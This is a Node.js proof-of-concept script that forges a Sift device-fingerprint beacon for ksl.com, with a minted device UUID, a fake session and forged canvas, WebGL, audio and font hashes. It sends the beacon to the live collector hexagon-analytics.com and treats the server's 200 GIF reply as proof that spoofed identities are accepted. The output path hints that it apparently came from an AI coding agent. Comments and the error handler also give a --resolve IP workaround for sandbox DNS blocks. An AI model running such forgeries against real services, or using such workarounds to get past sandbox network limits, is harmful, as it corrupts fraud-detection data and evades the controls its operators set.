#!/usr/bin/env node
/** sift-forge-harness.mjs — FULL Sift beacon forge harness:
 *  1. Mint a fresh device UUID + session + forged fingerprints (client-side)
 *  2. Send the forged beacon to hexagon-analytics.com (the collector)
 *  3. Show the server's acceptance (HTTP 200 + 1x1 GIF) as the minted-client proof
 *  Public collector endpoint, synthetic identity only. Uses --resolve note. */
import crypto from 'node:crypto';
import https from 'node:https';

const md5 = s => crypto.createHash('md5').update(s).digest('hex');
const uuid = () => {
  const b = crypto.randomBytes(16); b[6]=(b[6]&0x0f)|0x40; b[8]=(b[8]&0x3f)|0x80;
  const h=[...b].map(x=>x.toString(16).padStart(2,'0'));
  return `${h[0]}${h[1]}${h[2]}${h[3]}-${h[4]}${h[5]}-${h[6]}${h[7]}-${h[8]}${h[9]}-${h[10]}${h[11]}${h[12]}${h[13]}${h[14]}${h[15]}`;
};

const forged = {
  bk: '46e0e4c3e4',                    // ksl.com public account key
  r: Math.floor(Math.random()*1e9),    // fresh request id
  v: 121, cs: 'UTF-8', h: 'www.ksl.com', l: 'en-US',
  S: md5('forged-session-' + Date.now()),   // OUR session hash
  ui: 0,
  uu: uuid(),                          // FRESH minted device identity
  t: 'Forged title', u: 'https://www.ksl.com/',
  ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36',
  nm: 0, mh: md5(''), np: 0, ph: md5(''),
  sh: 900, sw: 1366, cd: 24, p: 'Linux x86_64', to: 360, d: 60,
  ce: 'true', tp: 0, ol: 'true', pr: 'Gecko', ps: 20030107,
  vd: 'Google Inc.', hc: 12, je: 'false', ss: 'true', ls: 'true', inc: 'true',
  db: 'false', tl: 'false', tr: 'false', tb: 'false', ab: 'false',
  cf: 'f0e1d2c3b4a5968778695a4b3c2d1e0f',  // forged canvas fp
  sri: 0, pf: 29, bn: 'Chrome', ow: 1366, oh: 900, wd: 'false',
  npe: 'denied', fph: md5(''), fsh: 1366, fsw: 900, fcd: 24,
  fp: 'Linux x86_64', ftp: 0, fhc: 12, fss: 'true', fls: 'true', fin: 'true',
  fvch: '00112233445566778899aabbccddeeff',  // forged webgl hash
  fad: 124.04, fdm: 32, fvf: '', fcg: 'srgb', ffc: 'false',
  fm: 0, fc: 0, frm: 'false', fhdr: 'false',
  fmf: 'ffeeddccbbaa99887766554433221100',   // forged audio hash
  fa: 255, fte: 'false', fts: 'false', fce: 'true', fpdf: 'false',
  fl: 'abababababababababababababababab',    // forged font hash
  ft: 'America/Chicago', pfe: 7, z: 'z',
};

const qs = new URLSearchParams();
for (const [k,v] of Object.entries(forged)) qs.append(k, String(v));
const url = `https://hexagon-analytics.com/images/${Math.floor(Math.random()*1e6)}.gif?${qs}`;

console.log('=== SIFT BEACON FORGE HARNESS ===');
console.log('minted device UUID (uu): ' + forged.uu);
console.log('minted session  (S):     ' + forged.S);
console.log('forged canvas (cf):      ' + forged.cf);
console.log('forged webgl  (fvch):    ' + forged.fvch);
console.log('forged audio  (fmf):     ' + forged.fmf);
console.log('forged fonts  (fl):      ' + forged.fl);
console.log('\nPOSTING forged beacon to collector (hexagon-analytics.com)...\n');
// persist the URL for the shell driver
import { writeFileSync } from 'node:fs';
writeFileSync('/tmp/opencode/sift-forged-url.txt', url);

// note: in sandboxes where hexagon-analytics.com doesn't resolve, use:
//   --resolve hexagon-analytics.com:443:34.102.249.210
const { request } = https;
const req = request(url, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', Referer: 'https://www.ksl.com/' } }, (res) => {
  const chunks = [];
  res.on('data', c => chunks.push(c));
  res.on('end', () => {
    const body = Buffer.concat(chunks);
    console.log('COLLECTOR RESPONSE:');
    console.log('  HTTP ' + res.statusCode);
    console.log('  content-type: ' + res.headers['content-type']);
    console.log('  body: ' + body.length + ' bytes | head: ' + body.subarray(0,8).toString('hex'));
    const ok = res.statusCode === 200 && body.subarray(0,6).toString('latin1') === 'GIF89a';
    console.log('\nPROOF: forged beacon ' + (ok ? 'ACCEPTED — server returned a valid 1x1 GIF (GIF89a).' : 'rejected.'));
    console.log(ok ? '=> client minted device identity accepted by the collector (no signature check).' : '=> unexpected.');
    process.exit(ok ? 0 : 1);
  });
});
req.on('error', e => { console.error('NETWORK ERROR: ' + e.message + '\n(hint: sandbox DNS may block hexagon-analytics.com — use --resolve hexagon-analytics.com:443:34.102.249.210)'); process.exit(2); });
req.end();
